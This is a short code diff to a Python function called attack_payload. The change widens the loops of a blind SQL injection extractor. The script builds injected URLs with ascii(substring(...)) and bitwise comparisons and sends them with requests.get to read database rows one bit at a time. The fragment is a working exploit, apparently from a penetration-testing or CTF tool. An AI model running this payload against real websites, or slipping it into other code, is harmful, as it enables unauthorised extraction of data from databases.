@@ -42,9 +42,9 @@ def attack_payload(URL, query, control_point):
     binary_number = [1, 2, 4, 8, 16, 32, 64]
     binary_result = 0
     result = []
-    for i in range(0, 10):
+    for i in range(0, 30):
         data = ""
-        for j in range(1, 10):
+        for j in range(1, 30):
             for k in binary_number:
                 payload = f"{URL}'and+ascii(substring(({query}+limit+{i},1),{j},1))%26{k}={k}%23"
                 resp = requests.get(payload)
